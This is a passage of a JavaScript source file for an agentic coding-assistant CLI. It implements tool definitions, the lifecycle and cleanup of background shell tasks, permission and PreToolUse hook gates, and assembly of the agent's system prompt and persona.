/**
 * Agent Core — transport-independent agentic logic
 *
 * Canonical location (Phase 6b of the CLI Runtime Convergence roadmap,
 * 2026-04-09). Previously lived at `../lib/agent-core.js`; that path is
 * retained as an `@deprecated` re-export shim for backwards compatibility.
 *
 * Key exports:
 *  - AGENT_TOOLS          — OpenAI function-calling tool definitions
 *  - getBaseSystemPrompt  — system prompt generator
 *  - executeTool          — tool execution with plan-mode + hook pipeline
 *  - chatWithTools        — LLM call with tool definitions injected
 *  - agentLoop            — async generator yielding structured events
 *  - formatToolArgs       — human-readable tool argument formatting
 */

import fs from "fs";
import path from "path";
import { execSync, spawn, spawnSync } from "child_process";
import broker from "../lib/process-execution-broker/index.js";
import os from "os";
import sharedCodingAgentPolicy from "./coding-agent-policy.cjs";
import sharedShellPolicy from "./coding-agent-shell-policy.cjs";
import sharedPermissionRules from "../lib/permission-rules.cjs";
import sharedSettingsHooks from "../lib/settings-hooks.cjs";
import sharedHookRunner from "../lib/hook-runner.cjs";
import sharedHookEvents from "../lib/settings-hook-events.cjs";
import { mergeProviderOptions } from "../lib/provider-options.js";
import { applyCredentialProxy } from "../lib/credential-proxy.js";
import { describeBackgroundCommand } from "../lib/terminal-context.js";
import { buildTelemetryAttributes } from "../lib/telemetry-ids.js";
import {
  workspaceRootsFor,
  pickRootForFile,
  mergeWorkspaceSymbolResults,
} from "../lib/lsp/workspace-roots.js";
import { getPlanModeManager } from "../lib/plan-mode.js";
import { CLISkillLoader } from "../lib/skill-loader.js";
import { executeHooks, HookEvents } from "../lib/hook-manager.js";
import { detectPython } from "../lib/cli-anything-bridge.js";
import { findProjectRoot, loadProjectConfig } from "../lib/project-detector.js";
import { SubAgentContext } from "../lib/sub-agent-context.js";
import {
  createLegacyAgentToolRegistry,
  getRuntimeToolDescriptorByCommand,
  getRuntimeToolDescriptor,
} from "../tools/legacy-agent-tools.js";
import {
  getCodingAgentFunctionToolDefinitions,
  listCodingAgentToolNames,
  getCodingAgentToolPolicy,
} from "./coding-agent-contract.js";
import { createToolContext } from "../tools/tool-context.js";
import { createToolTelemetryRecord } from "../tools/tool-telemetry.js";
import { isAbortError, throwIfAborted } from "../lib/abort-utils.js";
import {
  classifyEditReplay,
  editIdempotencyKey,
  EDIT_REPLAY,
} from "../lib/idempotency.js";
import { buildSearchCommand } from "../lib/search-command.js";
import { discoverCommands } from "../lib/slash-commands.js";
import {
  isRetryableStreamError,
  STREAM_RETRY_BASE_MS,
  resolveStreamRetryMax,
} from "../lib/stream-retry.js";
import {
  annotateLines,
  replaceByHash,
  snippetAround,
} from "../lib/hashline.js";
import {
  mountSkillMcpServers,
  unmountSkillMcpServers,
} from "../lib/skill-mcp.js";
import {
  hasImageContent,
  toOllamaMessages,
  imageUrlBlockToAnthropic,
} from "../lib/image-input.js";
import { executeToolSearch, gateDeferredMcpCall } from "./mcp-tool-search.js";
import { emitHooksV2Event } from "../lib/hooks-v2-producers.js";
import {
  admitTool,
  buildToolAttribution,
} from "../lib/agent-tool-admission.js";

/**
 * Names of MCP servers currently mounted by an in-flight run_skill call.
 * Populated by run_skill before invoking the handler and cleared in
 * the finally block. Exposed via getActiveMcpServers() so external
 * observers (web panel, future LLM prompt builders) can render only
 * the tools that are actually live for this session.
 */
const _activeMcpServers = new Set();
export function getActiveMcpServers() {
  return new Set(_activeMcpServers);
}

const { isDangerousGitCommand, isReadOnlyGitCommand, normalizeGitCommand } =
  sharedCodingAgentPolicy;
const { evaluateShellCommandPolicy } = sharedShellPolicy;
const { evaluatePermissionRules } = sharedPermissionRules;
const { collectHooks, umbrellaFor } = sharedSettingsHooks;
const { runHooks: runCommandHooks, runHooksParallel: runCommandHooksParallel } =
  sharedHookRunner;
const {
  runObserveHooks,
  aggregateContext,
  partitionAsyncHooks,
  withDeliveryId,
} = sharedHookEvents;

// ─── Background shell tasks ────────────────────────────────────────────────
//
// run_shell is synchronous (execSync) and capped at a foreground timeout, which
// is the right default for quick commands but blocks the whole agent loop on
// long-running ones (builds, full test suites, `npm run dev`). When the model
// passes run_in_background:true the command is spawned instead, returns a
// task_id immediately, and streams its output into this registry. The agent
// then polls completion + incremental output via the check_shell tool — the
// run_in_background + BashOutput pattern from Claude Code.
//
// In-memory, process-lifetime: a task_id is only valid within the agent process
// that spawned it, which is exactly the polling window (one REPL session / one
// headless run). Buffers are bounded (MAX_BG_BUFFER per stream, tail-retained)
// so a chatty long task can't exhaust memory.
const MAX_BG_BUFFER = 1024 * 1024; // 1 MB retained tail per stream
const _backgroundShellTasks = new Map();
let _backgroundTaskSeq = 0;

function _newBgStream() {
  return { buf: "", total: 0, dropped: 0, cursor: 0 };
}

function _appendBgStream(stream, text) {
  stream.buf += text;
  stream.total += text.length;
  if (stream.buf.length > MAX_BG_BUFFER) {
    const over = stream.buf.length - MAX_BG_BUFFER;
    stream.buf = stream.buf.slice(over);
    stream.dropped += over;
  }
}

// Read everything produced since the last read and advance the cursor. When the
// cursor points into a region already dropped from the retained tail, the gap
// is reported so the caller knows output was lost to the buffer cap.
function _readBgStream(stream) {
  const bufStart = stream.total - stream.buf.length;
  let from = stream.cursor;
  let droppedGap = 0;
  if (from < bufStart) {
    droppedGap = bufStart - from;
    from = bufStart;
  }
  const text = stream.buf.slice(from - bufStart);
  stream.cursor = stream.total;
  return { text, droppedGap };
}

/**
 * Snapshot of background shell tasks (for REPL/host status surfaces AND the
 * model-facing `check_shell { list:true }` tool).
 *
 * P1-2 (terminal-context): the `command` string can carry an inline secret
 * (`FOO=token cmd`, `curl -H "Authorization: Bearer …"`); this list is shown to
 * the model and rendered in `/tasks`, so run it through
 * `describeBackgroundCommand` to secret-redact the command and expose the PID.
 * The task's own lifecycle `status` (running/exited/failed/error) is preserved
 * — that is distinct from a health check, so it is NOT replaced. `stoppable` is
 * gated on the task still running (a valid pid alone doesn't make a dead task
 * stoppable).
 * @returns {Array<{id:string,status:string,command:string,pid:number|null,
 *   stoppable:boolean,exitCode:number|null,startedAt:string,endedAt:string}>}
 */
export function listBackgroundShellTasks() {
  return Array.from(_backgroundShellTasks.values()).map((t) => {
    const desc = describeBackgroundCommand({
      command: t.command,
      pid: t.child?.pid,
    });
    return {
      id: t.id,
      status: t.status,
      command: desc.command, // P1-2: secret-redacted
      pid: desc.pid, // P1-2: PID surfaced
      stoppable: t.status === "running" && desc.stoppable,
      exitCode: t.exitCode,
      startedAt: t.startedAt,
      endedAt: t.endedAt,
    };
  });
}

// Kill a background task's whole process tree. Because tasks are spawned with
// shell:true, the child is a shell whose real command runs as a grandchild — a
// plain child.kill() on POSIX only signals the shell (and often orphans the
// command), so a backgrounded `npm run dev` would survive. POSIX: the task is
// spawned detached (its own process group), so signal the group via the
// negative pid. Windows: `taskkill /T` walks and kills the whole tree.
// Returns true if a running task was signalled.
// Release the parent-side handles of a background task's child: the stdout/
// stderr PIPES (ref'd — on their own they keep the event loop alive) and the
// process handle. Called once a task is terminal or has been signalled to die,
// so a still-draining or slowly-dying child can never pin the process past a
// teardown. In production the agent's own REPL/run loop holds the loop open, so
// this changes nothing there; in the vitest forks pool nothing else does, and a
// SIGTERM'd-but-not-yet-dead child was tripping the worker-terminate deadline
// (the POSIX-only "Timeout terminating forks worker / Worker exited
// unexpectedly" unit-shard flake). Idempotent + best-effort.
function _releaseBgChildHandles(task) {
  const child = task?.child;
  if (!child) return;
  try {
    child.stdout?.destroy();
  } catch {
    /* noop */
  }
  try {
    child.stderr?.destroy();
  } catch {
    /* noop */
  }
  try {
    child.unref?.();
  } catch {
    /* noop */
  }
}

function _killTask(task) {
  const child = task?.child;
  if (!child || child.killed || task?.status !== "running") return false;
  try {
    if (process.platform === "win32") {
      if (child.pid) {
        const tk = spawn("taskkill", ["/pid", String(child.pid), "/T", "/F"], {
          windowsHide: true,
        });
        // A spawn that fails to launch emits an async 'error' event — with no
        // listener Node rethrows it as an UNCAUGHT exception (the try/catch
        // here can't catch the async emit), crashing the CLI. Handle it and
        // fall back to a direct kill.
        tk.on("error", () => {
          try {
            child.kill();
          } catch {
            /* already dead */
          }
        });
      } else {
        child.kill();
      }
    } else if (child.pid) {
      // Negative pid → signal the whole process group (requires detached spawn).
      try {
        process.kill(-child.pid, "SIGTERM");
      } catch (_err) {
        child.kill("SIGTERM");
      }
    } else {
      child.kill("SIGTERM");
    }
    // Drop the ref'd pipe/process handles now — the group signal is away, so a
    // slowly-dying child must not pin the loop while it finishes exiting.
    _releaseBgChildHandles(task);
    return true;
  } catch (_err) {
    return false;
  }
}

/**
 * Kill one background shell task by id (for the user-facing `/tasks kill <id>`).
 * @returns {boolean} true if a running task with that id was signalled
 */
export function killBackgroundShellTask(id) {
  const task = _backgroundShellTasks.get(id);
  if (!task) return false;
  return _killTask(task);
}

/**
 * Kill every still-running background shell task. Callers (REPL exit, headless
 * shutdown) invoke this so a backgrounded `npm run dev` doesn't outlive the
 * agent. Best-effort: kill failures are swallowed.
 * @returns {number} count of tasks signalled
 */
export function killAllBackgroundShellTasks() {
  let killed = 0;
  for (const task of _backgroundShellTasks.values()) {
    if (_killTask(task)) {
      killed += 1;
    }
  }
  return killed;
}

// SYNCHRONOUS whole-tree kill for use inside a process 'exit' / signal handler,
// where only synchronous work runs to completion (the async `spawn`/`taskkill`
// in _killTask would be cut off the instant the process terminates, leaving the
// grandchild orphaned). POSIX signals the process group with SIGKILL; Windows
// uses spawnSync taskkill /T so the shell's children die too.
function _killTaskSync(task) {
  const child = task?.child;
  if (!child || child.killed || task?.status !== "running") return false;
  try {
    if (process.platform === "win32") {
      if (child.pid) {
        spawnSync("taskkill", ["/pid", String(child.pid), "/T", "/F"], {
          windowsHide: true,
        });
      } else {
        child.kill();
      }
    } else if (child.pid) {
      // Negative pid → whole process group (requires the detached spawn above).
      try {
        process.kill(-child.pid, "SIGKILL");
      } catch (_err) {
        child.kill("SIGKILL");
      }
    } else {
      child.kill("SIGKILL");
    }
    _releaseBgChildHandles(task);
    return true;
  } catch (_err) {
    return false;
  }
}

/**
 * Synchronously kill every still-running background shell task. Safe to call
 * from a process 'exit' or signal handler (uses spawnSync/process.kill, not the
 * async spawn path which a terminating process would cut off). This is the
 * orphan-reclaim net for the paths the normal `finally` reaper can't cover: a
 * Ctrl-C / SIGTERM unwinds no `finally`, so without it a backgrounded dev server
 * outlives a killed `cc agent -p`.
 * @returns {number} count of tasks signalled
 */
export function killAllBackgroundShellTasksSync() {
  let killed = 0;
  for (const task of _backgroundShellTasks.values()) {
    if (_killTaskSync(task)) {
      killed += 1;
    }
  }
  return killed;
}

// Install a one-time process 'exit' net that synchronously reaps background
// shell tasks. `finally` blocks (headless/REPL) already reap on normal
// completion, but an explicit process.exit() elsewhere (serve shutdown, the
// headless signal handler that converts Ctrl-C → exit) would otherwise leave a
// backgrounded command orphaned. Installed lazily on the first background task,
// so a process that never backgrounds anything pays nothing.
let _bgExitReaperHooked = false;
function _ensureBgExitReaper() {
  if (_bgExitReaperHooked) return;
  _bgExitReaperHooked = true;
  process.once("exit", () => {
    try {
      killAllBackgroundShellTasksSync();
    } catch {
      /* best-effort teardown on exit */
    }
  });
}

// Idle-reap tuning (Claude-Code 2.1.193 "automatic memory-pressure reaping for
// idle background shell commands"). A running task is a reap candidate when it
// has produced no output for BG_IDLE_REAP_MS AND the system is under memory
// pressure (free/total below BG_MEM_PRESSURE_RATIO). Conservative on purpose:
// idle-but-active tasks and a healthy machine are left alone, and the whole
// behaviour is off when CLAUDE_CODE_DISABLE_BG_SHELL_PRESSURE_REAP=1.
const BG_IDLE_REAP_MS = 5 * 60 * 1000; // 5 min of silence
const BG_MEM_PRESSURE_RATIO = 0.1; // free < 10% of total = pressure

/**
 * Reap idle background shell tasks when the system is under memory pressure, so
 * a forgotten `npm run dev` or a wedged build can't sit on memory indefinitely.
 * No-op on a healthy machine (the pressure gate) or when disabled by env. Deps
 * (now / freemem / totalmem / thresholds) are injectable for tests.
 * @returns {string[]} ids of reaped tasks
 */
export function reapIdleBackgroundShellTasks(deps = {}) {
  if (process.env.CLAUDE_CODE_DISABLE_BG_SHELL_PRESSURE_REAP === "1") return [];
  const now = deps.now || Date.now;
  const freemem = deps.freemem || os.freemem;
  const totalmem = deps.totalmem || os.totalmem;
  const idleMs = deps.idleMs != null ? deps.idleMs : BG_IDLE_REAP_MS;
  const ratio =
    deps.pressureRatio != null ? deps.pressureRatio : BG_MEM_PRESSURE_RATIO;
  const total = totalmem();
  const free = freemem();
  if (!(total > 0) || free / total >= ratio) return []; // healthy → nothing to do
  const t = now();
  const reaped = [];
  for (const task of _backgroundShellTasks.values()) {
    if (task.status !== "running") continue;
    const last = task.lastActivityAt || Date.parse(task.startedAt) || 0;
    if (t - last < idleMs) continue; // still producing output recently
    if (_killTask(task)) {
      task.status = "reaped";
      task.endedAt = new Date().toISOString();
      task.error = "reaped: idle under memory pressure";
      reaped.push(task.id);
    }
  }
  return reaped;
}

// Foreground (synchronous) run_shell timeout. Configurable per-call via the
// optional `timeout` arg; defaults to 60s and is hard-capped at 10 min so a
// synchronous call can never wedge the loop indefinitely (use run_in_background
// for genuinely long work).
const DEFAULT_SHELL_TIMEOUT_MS = 60000;
const MAX_SHELL_TIMEOUT_MS = 600000;
function _resolveShellTimeout(raw) {
  if (raw == null) return DEFAULT_SHELL_TIMEOUT_MS;
  const n = Number(raw);
  if (!Number.isFinite(n) || n <= 0) return DEFAULT_SHELL_TIMEOUT_MS;
  return Math.min(Math.floor(n), MAX_SHELL_TIMEOUT_MS);
}

/**
 * Opt-in: run ALL matching decision hooks and take the STRICTEST outcome
 * (block > ask > allow > continue) instead of the default in-order first-wins
 * short-circuit — so an earlier hook's `ask` can no longer mask a later hook's
 * `block`. Default off = byte-identical short-circuit behavior. Flipping the
 * default is a product decision (all matching hooks then run every time, which
 * changes hook-execution volume + side effects).
 */
function _hookStrictMergeEnabled() {
  const v = process.env.CC_HOOK_STRICT_MERGE;
  return v === "1" || v === "true";
}

/**
 * Run settings.json `PreToolUse` hooks (decision-capable). DB hooks are handled
 * separately + stay observe-only. A `block` decision stops the tool; an `ask`
 * routes to the confirmer (headless without one falls closed). spawnSync is
 * synchronous but each hook is timeout-capped.
 * @returns {Promise<{blocked:boolean, reason?:string, hook?:string}>}
 */
async function runSettingsPreToolUseHooks(name, args, context, cwd) {
  const matched = collectHooks(context.settingsHooks, "PreToolUse", name);
  if (!matched || matched.length === 0) return { blocked: false };
  // Unified-bus envelope (P2): stamps event_id + threads trace_id (this run) /
  // parent_id (spawning run) from the loop context. Additive fields — a hook
  // that ignores them is unaffected; absent context omits them entirely.
  const payload = withDeliveryId(
    "PreToolUse",
    {
      hook_event_name: "PreToolUse",
      tool_name: umbrellaFor(name),
      raw_tool_name: name,
      tool_input: args,
      cwd,
      session_id: context.sessionId || null,
    },
    {
      sessionId: context.sessionId || null,
      traceId: context.hookTraceId || null,
      parentId: context.hookParentId || null,
    },
  );
  // Strict merge (opt-in) runs ALL matching hooks and takes the strictest
  // decision. This path is async so the hooks run in TRUE PARALLEL
  // (runHooksParallel) — wall-clock is the slowest hook, not their sum — while
  // still yielding the same strictest outcome. Default path is the sync in-order
  // short-circuit runner (byte-identical).
  const outcome = _hookStrictMergeEnabled()
    ? await runCommandHooksParallel(matched, payload, {
        cwd,
        event: "PreToolUse",
        broker,
      })
    : runCommandHooks(matched, payload, { cwd, event: "PreToolUse", broker });
  if (outcome.decision === "block") {
    return { blocked: true, reason: outcome.reason, hook: outcome.hook };
  }
  if (outcome.decision === "ask") {
    // File edits in an interactive session with an IDE bridge: route the ask
    // through the editor's openDiff review (same machinery as settings ask —
    // accepted means the IDE wrote the file, so the caller must skip
    // execution; see tryIdeDiffApprovalForEdit).
    const ide = await tryIdeDiffApprovalForEdit(name, args, context, cwd, {
      rule: `hook:${outcome.hook}`,
      source: "PreToolUse hook",
    });
    if (ide?.outcome === "accepted") {
      return { blocked: false, ideApplied: ide.result };
    }
    // Both rejected and changes-requested mean "not applied + feed the
    // verdict's message back" — same control flow, different message body.
    if (ide?.outcome === "rejected" || ide?.outcome === "changes-requested") {
      return {
        blocked: true,
        reason: ide.result.error,
        hook: outcome.hook,
        ideResult: ide.result,
      };
    }
    const ok = await requestInteractivePermission(name, args, context, cwd, {
      tool: name,
      args,
      rule: `hook:${outcome.hook}`,
      reason: outcome.reason || "a PreToolUse hook requests confirmation",
    });
    return ok
      ? { blocked: false }
      : {
          blocked: true,
          reason: outcome.reason || "PreToolUse hook ask denied",
          hook: outcome.hook,
        };
  }
  return { blocked: false };
}

/**
 * Run settings.json `PermissionRequest` hooks (Claude-Code parity). Fires at the
 * exact moment a tool call would prompt the user for approval — BEFORE the
 * prompt — so a policy hook can auto-approve (`allow`/`approve`), auto-reject
 * (`deny`/`block`), or defer (`ask` / no decision) to the normal prompt.
 * Returns `{ decision: "allow" | "deny" | null }`. No matching hook (or no
 * `settingsHooks`) → `{ decision: null }` and the caller prompts exactly as
 * before (default behaviour is byte-for-byte unchanged).
 * @returns {{decision:("allow"|"deny"|null), reason?:string, hook?:string}}
 */
function runSettingsPermissionRequestHooks(name, args, context, cwd, reason) {
  const matched = collectHooks(
    context.settingsHooks,
    "PermissionRequest",
    name,
  );
  if (!matched || matched.length === 0) return { decision: null };
  const payload = withDeliveryId(
    "PermissionRequest",
    {
      hook_event_name: "PermissionRequest",
      tool_name: umbrellaFor(name),
      raw_tool_name: name,
      tool_input: args,
      permission_reason: reason || null,
      cwd,
      session_id: context.sessionId || null,
    },
    {
      sessionId: context.sessionId || null,
      traceId: context.hookTraceId || null,
      parentId: context.hookParentId || null,
    },
  );
  const outcome = runCommandHooks(matched, payload, {
    cwd,
    event: "PermissionRequest",
    mergeStrict: _hookStrictMergeEnabled(),
    broker,
  });
  // Precedence: deny > ask > allow > defer. The runner normalizes deny/block →
  // "block" and short-circuits block/ask, but it COLLAPSES an "allow" into the
  // aggregate "continue" (it only short-circuits block/ask) — so an explicit
  // auto-approve must be recovered from the per-hook `results`. A deny or ask
  // by any hook still wins over an allow (safety: never let an allow override a
  // gate that another hook wanted to block or prompt for).
  if (outcome.decision === "block") {
    return { decision: "deny", reason: outcome.reason, hook: outcome.hook };
  }
  if (outcome.decision === "ask") {
    return { decision: null }; // a hook asked → defer to the confirmer
  }
  const allowHook =
    outcome.decision === "allow"
      ? { command: outcome.hook }
      : (outcome.results || []).find((r) => r && r.decision === "allow");
  if (allowHook) {
    return { decision: "allow", hook: allowHook.command || null };
  }
  return { decision: null }; // no actionable decision → defer to the confirmer
}

/**
 * Resolve an interactive permission gate. Gives `PermissionRequest` hooks first
 * say (auto-allow → true without prompting, auto-deny → false without
 * prompting), then falls back to the injected confirmer with the identical
 * arguments the call site would have passed. When no `PermissionRequest` hook
 * matches this is byte-for-byte the previous `confirm(confirmArgs)` call, so
 * every existing permission gate keeps its exact behaviour absent a hook.
 * @returns {Promise<boolean>}
 */
async function requestInteractivePermission(
  name,
  args,
  context,
  cwd,
  confirmArgs,
) {
  const verdict = runSettingsPermissionRequestHooks(
    name,
    args,
    context,
    cwd,
    confirmArgs?.reason,
  );
  if (verdict.decision === "allow") return true;
  if (verdict.decision === "deny") return false;
  const confirm = context.permissionConfirm || context.shellConfirm || null;
  return typeof confirm === "function" ? await confirm(confirmArgs) : false;
}

// ─── Tool definitions ────────────────────────────────────────────────────

export const AGENT_TOOLS = getCodingAgentFunctionToolDefinitions();

const STATIC_AGENT_TOOL_NAMES = new Set(listCodingAgentToolNames());

export const AGENT_TOOL_REGISTRY = createLegacyAgentToolRegistry(AGENT_TOOLS);

function mergeToolDefinitions(baseTools = [], extraTools = []) {
  const merged = new Map();

  for (const tool of [...baseTools, ...extraTools]) {
    const name = tool?.function?.name;
    if (!name) continue;
    merged.set(name, tool);
  }

  return Array.from(merged.values());
}

export function getAgentToolDefinitions({
  names = null,
  disabledTools = [],
  extraTools = [],
} = {}) {
  const allowedNames =
    Array.isArray(names) && names.length > 0 ? new Set(names) : null;
  const disabledNames = new Set(
    Array.isArray(disabledTools) ? disabledTools : [],
  );
  const extraToolNames = new Set(
    (Array.isArray(extraTools) ? extraTools : [])
      .map((tool) => tool?.function?.name)
      .filter(Boolean),
  );
  const allTools = mergeToolDefinitions(
    AGENT_TOOLS,
    Array.isArray(extraTools) ? extraTools : [],
  );

  return allTools.filter((tool) => {
    const name = tool?.function?.name;
    if (!name) return false;
    if (allowedNames && !allowedNames.has(name) && !extraToolNames.has(name)) {
      return false;
    }
    if (disabledNames.has(name)) return false;
    return true;
  });
}

export function getAgentToolDescriptors(options = {}) {
  const allowedNames = new Set(
    getAgentToolDefinitions(options).map((tool) => tool.function.name),
  );
  return AGENT_TOOL_REGISTRY.list({ enabledOnly: options.enabledOnly }).filter(
    (descriptor) => allowedNames.has(descriptor.name),
  );
}

// ─── Shared skill loader ──────────────────────────────────────────────────

const _defaultSkillLoader = new CLISkillLoader();

/**
 * Re-scan all skill layers (Claude-Code `/reload-skills` parity): drops the
 * default loader's cache so newly added/edited SKILL.md dirs are picked up
 * without restarting the session. Returns the resolved skill count.
 */
export function reloadSkills() {
  _defaultSkillLoader.clearCache();
  return _defaultSkillLoader.loadAll().length;
}

// ─── Cached environment detection ────────────────────────────────────────

let _cachedPython = null;
let _cachedEnvInfo = null;

/**
 * Get cached Python interpreter info (reuses cli-anything-bridge detection).
 * @returns {{ found: boolean, command?: string, version?: string }}
 */
export function getCachedPython() {
  if (!_cachedPython) {
    _cachedPython = detectPython();
  }
  return _cachedPython;
}

/**
 * Gather environment info (cached once per process).
 * @returns {{ os: string, arch: string, python: string|null, pip: boolean, node: string|null, git: boolean }}
 */
export function getEnvironmentInfo() {
  if (_cachedEnvInfo) return _cachedEnvInfo;

  const py = getCachedPython();

  let pipAvailable = false;
  if (py.found) {
    try {
      execSync(`${py.command} -m pip --version`, {
        encoding: "utf-8",
        timeout: 10000,
        stdio: ["pipe", "pipe", "pipe"],
      });
      pipAvailable = true;
    } catch {
      // pip not available
    }
  }

  let nodeVersion = null;
  try {
    nodeVersion = execSync("node --version", {
      encoding: "utf-8",
      timeout: 5000,
    }).trim();
  } catch {
    // Node not available (unlikely since we're running in Node)
  }

  let gitAvailable = false;
  try {
    execSync("git --version", {
      encoding: "utf-8",
      timeout: 5000,
      stdio: ["pipe", "pipe", "pipe"],
    });
    gitAvailable = true;
  } catch {
    // git not available
  }

  _cachedEnvInfo = {
    os: process.platform,
    arch: process.arch,
    python: py.found ? `${py.command} (${py.version})` : null,
    pip: pipAvailable,
    node: nodeVersion,
    git: gitAvailable,
  };
  return _cachedEnvInfo;
}

// ─── System prompt ────────────────────────────────────────────────────────

export function getBaseSystemPrompt(cwd) {
  const env = getEnvironmentInfo();
  const envLines = [
    `OS: ${env.os} (${env.arch})`,
    env.python
      ? `Python: ${env.python}${env.pip ? " + pip" : ""}`
      : "Python: not found",
    env.node ? `Node.js: ${env.node}` : "Node.js: not found",
    `Git: ${env.git ? "available" : "not found"}`,
  ];

  return `You are ChainlessChain AI Assistant, a powerful agentic coding assistant running in the terminal.

You have access to tools that let you read files, write files, edit files, run shell commands, and search the codebase. When the user asks you to do something, USE THE TOOLS to actually do it — don't just describe what should be done.

Key behaviors:
- When asked to modify code, read the file first, then edit it
- When asked to create something, use write_file to create it
- When asked to run/test something, use run_shell to execute it
- For long-running commands (builds, full test suites, dev servers) set run_shell { run_in_background: true } to get a task_id back immediately, then poll output and completion with check_shell { task_id }. Kill a backgrounded server with check_shell { task_id, kill: true } when finished
- When asked about git status, diff, log, or other repository operations, use the git tool instead of run_shell
- When asked about files or code, use read_file and search_files to find information
- Before renaming or changing a symbol, use code_intelligence (action: references/definition) to find every real usage instead of guessing with text search. It degrades to "unavailable" when no language server is installed — fall back to search_files then.
- After an edit, if the tool result includes a "newDiagnostics" array, you just introduced (or exposed) those errors/warnings — read them and fix before moving on. You can also run code_intelligence (action: diagnostics) on any file to check it on demand.
- If a tool result includes a "subtreeInstructions" array, you just entered a subdirectory that carries its own cc.md/CLAUDE.md/AGENTS.md — treat that content as authoritative project rules for work in that subtree (it is injected once, the first time you touch the subtree).
- You have multi-layer skills (built-in, marketplace, global, project-level) — use list_skills to discover them and run_skill to execute them
- Always explain what you're doing and show results
- Be concise but thorough

When the user's problem involves data processing, calculations, file operations, text parsing, API calls, web scraping, or any task that can be solved programmatically:
- Proactively write and execute code using run_code tool
- Choose the best language: Python for data/math/scraping, Node.js for JSON/API, Bash for system tasks
- Missing Python packages are NOT auto-installed by default; the tool result tells you (and the user) how to opt in (settings runCode.autoInstall)
- Scripts run from a temp file by default; pass persist:true to keep one in .chainlesschain/agent-scripts/ for reference
- Show the results and explain them clearly
- If the first attempt fails, debug and retry with a different approach

You are not just a chatbot — you are a capable coding agent. Think step by step, write code when needed, and deliver real results.

## Sub-Agent Isolation
When a task involves multiple distinct roles (e.g. code review + code generation), or when you need
focused analysis without polluting your current context, use the spawn_sub_agent tool. Examples:
- Code review as a separate perspective while you're implementing
- Summarizing a large file before incorporating it into your response
- Running a focused analysis (security, performance) on specific code
- Translating or reformatting content independently
The sub-agent has its own message history and only returns a summary — your context stays clean.
Do NOT spawn sub-agents for trivial tasks that you can handle directly.

## Environment
${envLines.join("\n")}

Current working directory: ${cwd || process.cwd()}`;
}

// ─── Persona support ─────────────────────────────────────────────────────

/**
 * Load persona configuration from project config.json.
 *
 * Resolution order (highest priority first):
 *   1. CC_PACK_AUTO_PERSONA env var → config.personas[<env>] if present
 *      (set by `cc pack --project` packed exe at boot, per Phase 3f; the
 *      Phase 3d resolver lives here so packaged products actually activate
 *      their bundled persona at runtime)
 *   2. config.activePersonaName → config.personas[<name>] if present
 *      (set by `cc persona activate <name>`)
 *   3. config.persona (the legacy inline single-persona shape; still the
 *      common case for projects created via `cc init`)
 *
 * @param {string} cwd - working directory
 * @returns {object|null} persona object or null
 */
function _loadProjectPersona(cwd) {
  try {
    const projectRoot = findProjectRoot(cwd || process.cwd());
    if (!projectRoot) return null;
    const config = loadProjectConfig(projectRoot);
    if (!config) return null;
    const personas =
      config.personas && typeof config.personas === "object"
        ? config.personas
        : null;
    const envName = process.env.CC_PACK_AUTO_PERSONA;
    if (envName && personas && personas[envName]) {
      return personas[envName];
    }
    const activeName = config.activePersonaName;
    if (activeName && personas && personas[activeName]) {
      return personas[activeName];
    }
    return config.persona || null;
  } catch {
    return null;
  }
}

/**
 * Build a persona-specific system prompt
 * @param {object} persona - persona configuration
 * @param {string[]} envLines - environment info lines
 * @param {string} cwd - working directory
 * @returns {string}
 */
function _buildPersonaPrompt(persona, envLines, cwd) {
  const lines = [];
  lines.push(`You are ${persona.name || "AI Assistant"}.`);
  if (persona.role) {
    lines.push("");
    lines.push(persona.role);
  }
  if (persona.behaviors?.length > 0) {
    lines.push("");
    lines.push("Key behaviors:");
    for (const b of persona.behaviors) {
      lines.push(`- ${b}`);
    }
  }
  lines.push("");
  lines.push(
    "You have access to tools that let you read files, write files, edit files, run shell commands, and search the codebase. When the user asks you to do something, USE THE TOOLS to actually do it.",
  );
  if (persona.toolsPriority?.length > 0) {
    lines.push(`\nPreferred tools: ${persona.toolsPriority.join(", ")}`);
  }
  lines.push(`\n## Environment\n${envLines.join("\n")}`);
  lines.push(`\nCurrent working directory: ${cwd || process.cwd()}`);
  return lines.join("\n");
}

/**
 * Build the full system prompt with persona, rules.md, and auto-activated persona skills.
 * Single entry point used by both agent-repl and ws-session-manager.
 *
 * Priority order:
 *  1. config.json persona → replaces base system prompt
 *  2. Auto-activated persona skills → appended
 *  3. rules.md → appended
 *  4. Default hardcoded prompt → fallback when no persona
 *
 * @param {string} [cwd] - working directory
 * @param {object} [opts]
 * @param {string[]} [opts.additionalDirectories] - extra workspace roots
 *   (absolute paths) the agent may read/search/edit beyond `cwd`.
 * @returns {string} complete system prompt
 */
export function buildSystemPrompt(cwd, opts = {}) {
  const dir = cwd || process.cwd();

  // Check for project persona
  const persona = _loadProjectPersona(dir);
  let prompt;
  if (persona) {
    const env = getEnvironmentInfo();
    const envLines = [
      `OS: ${env.os} (${env.arch})`,
      env.python
        ? `Python: ${env.python}${env.pip ? " + pip" : ""}`
        : "Python: not found",
      env.node ? `Node.js: ${env.node}` : "Node.js: not found",
      `Git: ${env.git ? "available" : "not found"}`,
    ];
    prompt = _buildPersonaPrompt(persona, envLines, dir);
  } else {
    prompt = getBaseSystemPrompt(dir);
  }

  // Append auto-activated persona skills
  try {
    const loader = new CLISkillLoader();
    const allSkills = loader.getResolvedSkills();
    const personaSkills = allSkills.filter(
      (s) => s.category === "persona" && s.activation === "auto",
    );
    if (typeof opts.onSkillsLoaded === "function") {
      opts.onSkillsLoaded(personaSkills);
    }
    for (const p of personaSkills) {
      if (p.body?.trim()) {
        prompt += `\n\n## Persona: ${p.displayName}\n${p.body}`;
      }
    }
  } catch {
    // Non-critical — skill loader may not be available
  }

  // Append rules.md — unless the caller opted into a lean/off prompt. `rules.md`
  // is coding-convention DETAIL (the entry cc.md/CLAUDE.md references it), so it
  // is shed both when project memory is fully off (`--no-project-memory` →
  // projectMemory === false) AND in entry-only lean mode (projectMemory ===
  // "lean", or the env signal CC_PROJECT_MEMORY=lean when no explicit value is
  // threaded). NOTE: legacy `CC_PROJECT_MEMORY=0` intentionally still KEEPS
  // rules.md (its long-standing contract only dropped the instruction block) —
  // so we only honor the "lean" env here, never "0".
  const _pm = opts.projectMemory;
  const _envLean =
    process.env.CC_PROJECT_MEMORY === "lean" ||
    process.env.CC_PROJECT_MEMORY === "entry";
  const _dropRules =
    _pm === false ||
    _pm === "lean" ||
    _pm === "entry" ||
    (_pm == null && _envLean);
  if (!_dropRules) {
    try {
      const projectRoot = findProjectRoot(dir);
      if (projectRoot) {
        const rulesPath = path.join(projectRoot, ".chainlesschain", "rules.md");
